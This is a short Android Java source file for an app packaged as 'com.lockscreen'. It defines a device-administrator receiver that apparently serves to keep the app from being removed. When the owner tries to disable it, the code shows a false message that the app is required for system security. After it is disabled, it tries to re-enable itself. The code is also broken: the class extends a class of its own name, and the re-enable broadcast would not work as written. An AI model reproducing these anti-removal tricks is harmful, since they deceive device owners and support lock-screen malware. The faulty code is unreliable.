package com.lockscreen;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

public class DeviceAdminReceiver extends DeviceAdminReceiver {

    @Override
    public void onEnabled(Context context, Intent intent) {
        Toast.makeText(context, "Device Admin Enabled", Toast.LENGTH_SHORT).show();
    }

    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        // Block uninstall attempt
        return "This application is required for system security and cannot be disabled";
    }

    @Override
    public void onDisabled(Context context, Intent intent) {
        // Try to re-enable
        Intent reenable = new Intent(DeviceAdminReceiver.ACTION_DEVICE_ADMIN_ENABLED);
        context.sendBroadcast(reenable);
    }
}
